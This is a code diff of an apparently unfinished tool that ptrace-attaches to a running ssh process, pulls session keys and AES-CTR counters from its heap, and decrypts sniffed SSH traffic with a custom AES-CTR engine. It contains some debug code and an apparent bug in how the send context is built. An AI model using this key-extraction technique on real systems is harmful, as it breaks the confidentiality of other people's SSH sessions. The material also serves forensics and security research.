@@ -10,64 +10,151 @@ import os,logging,sys
 #use volatility?
 
 import abouchet
-import ctypes_openssh
+import ctypes, model, ctypes_openssh
+from ctypes_openssh import AES_BLOCK_SIZE
 
 # linux only
 from ptrace.debugger.debugger import PtraceDebugger
 from ptrace.debugger.memory_mapping import readProcessMappings
 
-from paramiko.packet import Packetizer
+from paramiko.packet import Packetizer, NeedRekeyException
 from paramiko.transport import Transport
-#from paramiko import util
+from paramiko import util
+from paramiko.util import Counter
+from paramiko.common import *
 
 log=logging.getLogger('sslsnoop.openssh')
 
+from ctypes import cdll
 
-def get_cipher(name, key, iv, counter=None):
-  ''' paramiko _get_cipher in transport.py:1467 '''
-  if name != "aes128-ctr":
-    print 'UNKOWN CIPHER MEC'
-    ##return self._cipher_info[name]['class'].new(key, self._cipher_info[name]['mode'], iv)
-    return None
-  # CTR modes, we need a counter
-  #counter = Counter.new(nbits=Trasnport._cipher_info[name]['block-size'] * 8, initial_value=util.inflate_long(iv, True))
-  return Transport._cipher_info[name]['class'].new(key, Transport._cipher_info[name]['mode'], iv, counter)
+libopenssl=cdll.LoadLibrary('libssl.so')
 
-def activate_cipher(packetizer, cipher, mac=None):
+
+
+def testDecrypt(packetizer):
+  _expected_packet = tuple()
+  while ( True ):
+    try:
+      ptype, m = packetizer.read_message()
+    except NeedRekeyException:
+      continue
+    if ptype == MSG_IGNORE:
+      continue
+    elif ptype == MSG_DISCONNECT:
+      print "DISCONNECT MESSAGE"
+      print m
+      packetizer.close()
+      break
+    elif ptype == MSG_DEBUG:
+      always_display = m.get_boolean()
+      msg = m.get_string()
+      lang = m.get_string()
+      log.debug('Debug msg: ' + util.safe_string(msg))
+      continue
+    if len(_expected_packet) > 0:
+      if ptype not in _expected_packet:
+        raise SSHException('Expecting packet from %r, got %d' % (_expected_packet, ptype))
+      _expected_packet = tuple()
+      if (ptype >= 30) and (ptype <= 39):
+        print "KEX Message, we need to rekey"
+        continue
+  print 'Test descrypt Finished'  
+
+
+
+
+class StatefulAESEngine():
+  #ctx->cipher->do_cipher(ctx,out,in,inl);
+  # -> openssl.AES_ctr128_encrypt(&in,&out,length,&aes_key, ivecArray, ecount_bufArray, &num )
+  #AES_encrypt(ivec, ecount_buf, key); # aes_key is struct with cnt, key is really AES_KEY->aes_ctx
+  #AES_ctr128_inc(ivec); #ssh_Ctr128_inc semble etre different, mais paramiko le fait non ?
+  def __init__(self, context ):
+    self.context= context
+    self.aes_key = context.app_data 
+    # we need nothing else
+    self.key = self.aes_key.aes_ctx
+    self._AES_encrypt=libopenssl.AES_encrypt
+    print 'cipher:%s block_size: %d key_len: %d '%(context.name, context.block_size, context.key_len)
+  
+  def decrypt(self,block):
+    bLen=len(block)
+    if bLen % AES_BLOCK_SIZE:
+      log.error("Sugar, why do you give me a block the wrong size: %d not modulo of %d"%(bLen, AES_BLOCK_SIZE))
+      return None
+    dest=(ctypes.c_ubyte*bLen)()
+    if not self.ssh_aes_ctr(self.aes_key, dest, block, bLen ) :
+      return None
+    return model.array2bytes(dest)
+        
+  def ssh_aes_ctr(self, aes_key, dest, src, srcLen ):
+    # a la difference de ssh on ne prends pas l'EVP_context mais le ssh context
+    #  parceque j'ai pas un evp_cipher_ctx_evp_app_data pour l'isntant
+    n = 0
+    buf=(ctypes.c_ubyte*AES_BLOCK_SIZE)()
+    if srcLen==0:
+      return True
+    if not bool(aes_key):
+      return False
+    print 'src is a %s , dest is a %s and buf is a %s'%(type(src), dest, buf)
+    print 'src[0] is a %s , dest[0] is a %s and buf[0] is a %s'%(type(src[0]), dest[0], buf[0])
+    for i in range(0,srcLen):
+      if (n == 0):
+        # on ne bosse que sur le block_size ( ivec, dst, key )
+        self._AES_encrypt(ctypes.byref(aes_key.aes_counter), ctypes.byref(buf), ctypes.byref(aes_key.aes_ctx))
+        self.ssh_ctr_inc(aes_key.aes_counter, AES_BLOCK_SIZE)
+      # on recopie le resultat pour chaque byte du block
+      dest[i] = ord(src[i]) ^ buf[i]
+      n = (n + 1) % AES_BLOCK_SIZE
+    return True
+
+  def ssh_ctr_inc(self, ctr, ctrLen):
+    '''
+    @param ctr: a ubyte array
+        l'implementation ssh semble etre differente de l'implementation Openssl...
+    int i=0;
+    for (i = len - 1; i >= 0; i--)
+      if (++ctr[i])  /* continue on overflow */
+        return;
+    '''
+    for i in range(len(ctr)-1,-1,-1):
+      ctr[i]+=1
+      if ctr[i] != 0:
+        return
+
+
+
+def activate_cipher(packetizer, context):
   "switch on newly negotiated encryption parameters for inbound traffic"
-  key=  cipher.key
-  iv = cipher.iv
-  ctr = cipher.ctr
-  block_size = cipher.block_size
-  print 'cipher:%s block_size: %d key_len: %d IV len:%d'%(cipher.name, block_size,len(key),len(iv) )
-  engine = get_cipher(cipher.name, key, iv, ctr)
-  print engine
+  #packetizer.set_log(log)
+  engine = StatefulAESEngine(context)
+  print 'cipher:%s block_size: %d key_len: %d '%(context.name, context.block_size, context.key_len )
+  print engine, type(engine)
+
+  mac = context.mac
+  if mac is not None:
+    mac_key    = mac.getKey()
+    mac_engine = Transport._mac_info[mac.name.toString()]['class']
+  # fix our engines in packetizer
+  packetizer.set_inbound_cipher(engine, context.block_size, mac_engine, mac.mac_len , mac_key)
   '''  
-  mac_size = mac.mac_len 
-  mac_engine = Transport._mac_info[mac.name.toString()]['class']
-  # initial mac keys are done in the hash's natural size (not the potentially truncated
-  # transmission size)
-  if self.server_mode:
-      mac_key = self._compute_key('E', mac_engine.digest_size)
-  else:
-      mac_key = self._compute_key('F', mac_engine.digest_size)
-      
-  self.packetizer.set_inbound_cipher(engine, block_size, mac_engine, mac_size, mac_key)
   compress_in = self._compression_info[self.remote_compression][1]
   if (compress_in is not None) and ((self.remote_compression != 'zlib@openssh.com') or self.authenticated):
       self._log(DEBUG, 'Switching on inbound compression ...')
       self.packetizer.set_inbound_compressor(compress_in())
   '''
-
+  return
   
 def decryptSSHTraffic(scapySocket,ciphers):
-  inEnc,outEnc=ciphers.getCiphers()
+  receiveCtx,sendCtx = ciphers.getCiphers()
   # Inbound
-  inbound=Packetizer(scapySocket.getInboundSocket())
-  activate_cipher(inbound, inEnc )
+  inbound = Packetizer(scapySocket.getInboundSocket())
+  activate_cipher(inbound, receiveCtx )
+  
+  testDecrypt(inbound)
+  
   # out bound
-  outbound=Packetizer(scapySocket.getOutboundSocket())
-  activate_cipher(outbound, outEnc )
+  outbound = Packetizer(scapySocket.getOutboundSocket())
+  activate_cipher(outbound, sendCtx )
   return
 
 def launchScapyThread():
@@ -85,64 +172,50 @@ def launchScapyThread():
   return soscapy
 
 
-class EncryptionCipher:
-  def __init__(self,cipher,key,iv,ctr=None):
-    self.cipher=cipher
-    self.name=self.cipher.name.toString()
-    self.block_size=self.cipher.block_size
-    self.key=key
-    self.iv=iv
-    self.ctr=ctr
+class CipherContext:
+  '''
+  fields=    enc. mac , comp 
+      sshCtx ,  sshCipher 
+      evpCtx , evpCipher 
+      name #cipher name
+      key , key_len 
+      iv  , block_size 
+      app_data  
+  '''
+  pass
 
 class SessionCiphers():
   def __init__(self,session_state):
     self.sessions_state=session_state
+    # two ciphers    
+    self.receiveCtx=CipherContext()
+    self.sendCtx=CipherContext()
     # read cipher MODE_IN == 0
-    self.receiveEnc=self.sessions_state.newkeys[0].contents.enc
-    self.receiveMac=self.sessions_state.newkeys[0].contents.mac
-    self.receiveComp=self.sessions_state.newkeys[0].contents.comp
-    self.receiveCtx=session_state.receive_context
-    self.receiveCipherOpenSSH=self.receiveCtx.cipher.contents
-    self.receiveCipherName=self.receiveCipherOpenSSH.name.toString()
-    self.receiveCipherEVP=self.receiveCtx.evp.cipher.contents
-    self.receiveKeyContext=ctypes_openssh.getEvpAppData(self.receiveCtx)
-    self.receiveKey=self.receiveEnc.getKey()
-    self.receiveIV=self.receiveEnc.getIV()
-    self.receiveKeyCounter=None
-    if self.receiveCipherName.endswith('-ctr') and self.receiveCipherName.startswith('aes') :
-      self.receiveKeyCounter=self.receiveKeyContext.getCounter()
+    MODE=0
+    for ctx in [self.receiveCtx, self.sendCtx]:
+      ctx.enc =  self.sessions_state.newkeys[MODE].contents.enc
+      ctx.mac =  self.sessions_state.newkeys[MODE].contents.mac
+      ctx.comp = self.sessions_state.newkeys[MODE].contents.comp
+      ctx.sshCtx = session_state.receive_context
+      ctx.sshCipher = ctx.sshCtx.cipher.contents
+      ctx.evpCtx    = ctx.sshCtx.evp
+      ctx.evpCipher = ctx.sshCtx.evp.cipher.contents
+      # useful stuff
+      ctx.name = ctx.sshCipher.name.toString()
+      ctx.key  = ctx.enc.getKey()
+      ctx.key_len  = ctx.enc.key_len
+      ctx.iv   = ctx.enc.getIV()
+      ctx.block_size  = ctx.enc.block_size
+      ctx.app_data  = ctx.sshCtx.getEvpAppData() 
+      MODE+=1
     # 
-    self.receiveEncCipher=EncryptionCipher(self.receiveEnc, self.receiveKey, self.receiveIV, self.receiveKeyCounter)
-    
-    # write cipher MODE_IN == 1
-    self.sendEnc=self.sessions_state.newkeys[1].contents.enc
-    self.sendMac=self.sessions_state.newkeys[1].contents.mac
-    self.sendComp=self.sessions_state.newkeys[1].contents.comp
-    self.sendCtx=session_state.send_context
-    self.sendCipherOpenSSH=self.sendCtx.cipher.contents
-    self.sendCipherName=self.sendCipherOpenSSH.name.toString()
-    self.sendCipherEVP=self.sendCtx.evp.cipher.contents
-    self.sendKeyContext=ctypes_openssh.getEvpAppData(self.sendCtx)
-    self.sendKey=self.sendEnc.getKey()
-    self.sendIV=self.sendEnc.getIV()
-    self.sendKeyCounter=None
-    if self.sendCipherName.endswith('-ctr') and self.sendCipherName.startswith('aes') :
-      self.sendKeyCounter=self.sendKeyContext.getCounter()
-    # 
-    self.sendEncCipher=EncryptionCipher(self.sendEnc, self.sendKey, self.sendIV, self.sendKeyCounter)
     return
 
   def getCiphers(self):
-    return self.receiveEncCipher, self.sendEncCipher
- 
-  def getReceiveKey(self):
-    return self.receiveKey, self.receiveIV , self.receiveKeyCounter
-
-  def getSendKey(self):
-    return self.sendKey, self.sendIV, self.sendKeyCounter
+    return self.receiveCtx, self.sendCtx
   
   def __str__(self):
-    return "<SessionCiphers RECEIVE: '%s' SEND: '%s' >"%(self.receiveCipherName,self.sendCipherName)
+    return "<SessionCiphers RECEIVE: '%s' SEND: '%s' >"%(self.receiveCtx.name,self.sendCtx.name)
 
 
 
@@ -156,7 +229,8 @@ def findActiveSession(pid):
     return None
   # process is SIGSTOP-ed
   mappings=readProcessMappings(process)
-  session_state=None  
+  session_state=None
+  addr=None
   for m in mappings:
     ##debug, rsa is on head
     if m.pathname != '[heap]':
@@ -174,16 +248,16 @@ def findActiveSession(pid):
     elif len(outs) > 1:
       log.warning("Mmmh, multiple session_state. That is odd. I'll try with the first one.")
     #
-    session_state=outs[0]
-  return session_state
+    session_state,addr=outs[0]
+  return session_state,addr
   
 def findActiveKeys(pid):
-  session_state=findActiveSession(pid)
+  session_state,addr=findActiveSession(pid)
   if session_state is None:
     return None # raise Exception ... 
   ciphers=SessionCiphers(session_state)
-  log.info('Active state ciphers : %s'%(ciphers))
-  return ciphers
+  log.info('Active state ciphers : %s at 0x%lx'%(ciphers,addr))
+  return ciphers,addr
 
 def usage(txt):
   log.error("Usage : %s <pid of ssh>"% txt)
@@ -206,10 +280,11 @@ def main(argv):
   pid = int(argv[0])
   log.info("Target has pid %d"%pid)
   soscapy=launchScapyThread()
-  ciphers=findActiveKeys(pid)
+  ciphers,addr=findActiveKeys(pid)
   # process is running... sniffer is listening
+  print addr
   decryptSSHTraffic(soscapy,ciphers)
-  log.info("done for pid %d"%pid)
+  log.info("done for pid %d, struct at 0x%lx"%(pid,addr))
   sys.exit(0)
   return -1
 
